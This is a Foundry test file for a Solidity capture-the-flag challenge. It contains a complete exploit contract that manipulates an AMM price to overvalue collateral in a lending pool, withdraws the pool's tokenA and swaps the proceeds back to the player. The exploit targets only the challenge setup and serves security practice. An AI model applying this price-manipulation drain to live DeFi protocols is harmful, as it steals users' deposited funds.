// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup();
    }

    function testExploit() public {
        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        Exploit exploit = new Exploit(setup);
        exploit.execute();
        ////////// YOUR CODE END //////////

        emit log_named_decimal_uint(
            "user tokenA",
            setup.tokenA().balanceOf(playerAddress),
            setup.tokenA().decimals()
        );
        emit log_named_decimal_uint(
            "user tokenB",
            setup.tokenB().balanceOf(playerAddress),
            setup.tokenB().decimals()
        );
        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();
    }
}

////////// YOUR CODE GOES HERE //////////
contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function execute() public {
        setup.claim();
        setup.tokenA().approve(address(setup.amm()), type(uint256).max);
        setup.amm().swap(
            address(setup.tokenA()),
            address(setup.tokenB()),
            setup.tokenA().balanceOf(address(this))
        );

        uint256 lpA = setup.tokenA().balanceOf(address(setup.amm()));
        uint256 lpB = setup.tokenB().balanceOf(address(setup.amm()));
        uint256 withdrawAmount = setup.tokenA().balanceOf(
            address(setup.lendingPool())
        );
        uint256 depositAmount = (((withdrawAmount * lpB) / lpA) * 40) / 29; // Power

        setup.tokenB().approve(address(setup.lendingPool()), type(uint256).max);
        setup.lendingPool().supply(address(setup.tokenB()), depositAmount);
        setup.lendingPool().withdraw(address(setup.tokenA()), withdrawAmount);

        setup.tokenB().approve(address(setup.amm()), type(uint256).max);
        setup.amm().swap(
            address(setup.tokenB()),
            address(setup.tokenA()),
            setup.tokenB().balanceOf(address(this))
        );

        setup.tokenA().transfer(
            msg.sender,
            setup.tokenA().balanceOf(address(this))
        );
    }
}
////////// YOUR CODE END //////////
